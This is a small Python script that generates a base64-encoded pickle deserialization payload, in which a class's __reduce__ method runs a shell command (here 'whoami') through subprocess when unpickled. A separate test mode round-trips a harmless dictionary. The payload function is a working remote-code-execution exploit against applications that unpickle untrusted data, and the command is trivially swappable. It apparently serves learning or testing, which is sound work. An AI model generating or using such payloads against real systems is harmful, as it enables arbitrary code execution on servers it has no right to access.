import pickle
import base64
import sys
import subprocess

def payload():
    class RCE:
        def __reduce__(self):
            cmd = ("whoami")
            return subprocess.check_output, (cmd.split(),)
    payload = base64.b64encode(pickle.dumps(RCE()))
    print("[+] Payload: "+str(payload.decode()))


def test():
    data = {'name': 'CSB', 'grade': 4}
    print("[+]Serializing and Encoding the data")
    pickled_data = base64.b64encode(pickle.dumps(data))
    print(pickled_data.decode())
    print()
    print("[+] Deserializing and Decoding the data")
    decoded_data = base64.b64decode(pickled_data)
    up = pickle.loads(decoded_data)
    print(up)

if __name__ == '__main__':
    args = sys.argv[1]

    if args in ["test", "t"]:
        test()

    if args in ["payload", "p"]:
        payload()
